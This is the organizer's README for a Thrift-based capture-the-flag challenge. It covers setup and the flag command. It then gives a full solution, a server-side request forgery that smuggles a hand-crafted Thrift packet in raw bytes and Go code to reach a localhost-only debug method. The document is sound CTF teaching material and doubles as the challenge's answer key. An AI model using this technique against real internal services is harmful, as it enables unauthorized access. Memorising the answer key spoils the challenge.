# thrift-challenge

## Guide for CTF organizer

Challenge name: Homework Assignment 1337.
Challenge description:
```
Your homework assignment this evening is to write a simple Thrift client.

Your client must call the ping method on the homework server $SERVER:9090.
The server allows you to check your work, try using the server to ping facebook.com or something.

The ping.thrift file is provided here: $LINK
```


The file, `./dist/ping.thrift` should be given to the challengers as $LINK.
The `thrift-challenge -server` should be run somewhere accessible.
The IPv4 of this should be given as $SERVER.

To run the challenge using Docker:

```
docker build -t homework_assignment_1337 .
docker run -p 9090:9090 -it homework_assignment_1337
```

**How to set the flag**

On the host the server is running on, run:
```
thrift-challenge -flag 'key{you_win_the_game}'  
```

**How to solve this challenge**

You can write in any language, for example `go`: https://thrift.apache.org/tutorial/go

Run:
```
thrift -r --gen go ping.thrift
```

Challengers should see:
```
service PingBot {

  /**
   * A method definition looks like C code. It has a return type, arguments,
   * and optionally a list of exceptions that it may throw. Note that argument
   * lists and exception lists are specified using the exact same syntax as
   * field lists in struct or exception definitions.
   */

  Pong ping(1:Ping input),

  // Ignore this, internal testing.
  // Should only work for localhost connections either way.
  PongDebug pingdebug(1:Debug dummy),
}
```

In the thrift definition and hone in on `pingdebug`.

You win with a SSRF within `ping`.

The goal is write a `Ping.data` payload that creates a Thrift request for `pingdebug`.
Then set the `Ping.Host` to `localhost:9090`. 

Here is an example payload you can grab from Wireshark if you attempt a connection remotely.

```
    char peer0_0[] = { /* Packet 16 */
        0x80, 0x01, 0x00, 0x01 };
        char peer0_1[] = { /* Packet 18 */
        0x00, 0x00, 0x00, 0x09 };
        char peer0_2[] = { /* Packet 20 */
        0x70, 0x69, 0x6e, 0x67, 0x64, 0x65, 0x62, 0x75, 
        0x67 };
        char peer0_3[] = { /* Packet 22 */
        0x00, 0x00, 0x00, 0x01 };
        char peer0_4[] = { /* Packet 24 */
        0x0c };
        char peer0_5[] = { /* Packet 26 */
        0x00, 0x01 };
        char peer0_6[] = { /* Packet 28 */
        0x08 };
        char peer0_7[] = { /* Packet 30 */
        0x00, 0x01 };
        char peer0_8[] = { /* Packet 32 */
        0x00, 0x00, 0x00, 0x00 };
        char peer0_9[] = { /* Packet 34 */
        0x00 };
        char peer0_10[] = { /* Packet 36 */
        0x00 };
```

And an example solution:
```
func handleClientSolution(client *ping.PingBotClient) (err error) {
	pings := ping.NewPing()
	pings.Proto = ping.Proto_TCP
	pings.Host = "localhost:9090"
	pings.Data = "\x80\x01\x00\x01"
	pings.Data += "\x00\x00\x00\x09"
	pings.Data += "\x70\x69\x6e\x67\x64\x65\x62\x75\x67"
	pings.Data += "\x00\x00\x00\x01"
	pings.Data += "\x0c"
	pings.Data += "\x00\x01"
	pings.Data += "\x08"
	pings.Data += "\x00\x01"
	pings.Data += "\x00\x00\x00\x00"
	pings.Data += "\x00"
	pings.Data += "\x00"

	if msg, err := client.Ping(defaultCtx, pings); err != nil {
		fmt.Printf("ping() error %s\n", err.Error())
	} else {
		fmt.Printf("ping(): %s\n", msg)
	}

	return nil
}
```

## TODO

- Create `Dockerfile`
- Playtest in AWS
